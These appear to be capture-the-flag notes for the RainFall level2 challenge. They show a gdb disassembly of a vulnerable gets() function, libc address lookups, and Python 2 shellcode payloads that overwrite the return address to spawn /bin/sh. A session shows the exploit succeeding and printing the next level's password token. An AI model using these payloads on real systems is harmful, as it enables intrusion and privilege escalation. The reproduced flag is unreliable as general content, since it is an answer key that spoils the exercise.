



``` bash
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   ebp                              # Prologue
   0x080484d5 <+1>:	mov    ebp,esp                          # Prologue
   0x080484d7 <+3>:	sub    esp,0x68                         # Ajout de 104 octets sur la stack (espace global)
   0x080484da <+6>:	mov    eax,ds:0x8049860                 # 
   0x080484df <+11>:	mov    DWORD PTR [esp],eax            # 
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]                 # On met la valeur de ebp - 76 octets dans eax
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax            # esp pointe vers l'adresse dans eax (buffer)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>           # va ecrire dans la valeur pointee par [esp] (a ebp - 76 octets)
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]        
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.


```

ret to libc
``` bash
Breakpoint 1, 0x08048542 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb) 
(gdb) p execv
$3 = {<text variable, no debug info>} 0xb7ee4360 <execv>


```


```bash
python2 -c 'print "A"*10 + "\x90"*36 +  "\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80" + "\xe0\xf6\xff\xbf"' > payload
```
``` bash
python2 -c 'print "\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80" + "\x90"*46 + "\x08\xa0\x04\x08"' > payload

level2@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46" + "\x90"*46 + "\x08\xa0\x04\x08")'); cat) | ./level2 
j1X�̀�É�jF����������������������������������������������
id
level2@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"" + "\x90"*46 + "\x08\xa0\x04\x08")'); cat) | ./level2 
  File "<string>", line 1
    import sys; sys.stdout.write("\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"" + "\x90"*46 + "\x08\xa0\x04\x08")
                                                                                                                     ^
SyntaxError: unexpected character after line continuation character

^[[A^[[A^C
level2@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90"*46 + "\x08\xa0\x04\x08")'); cat) | ./level2 
j1X�̀�É�jFX̀�
           Rhn/shh//bi���̀�����������������������������������������
id
: not foundvel3) gid=2021(level2) egid=100(users) groups=2022(level3),100(users),2021(level2)
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```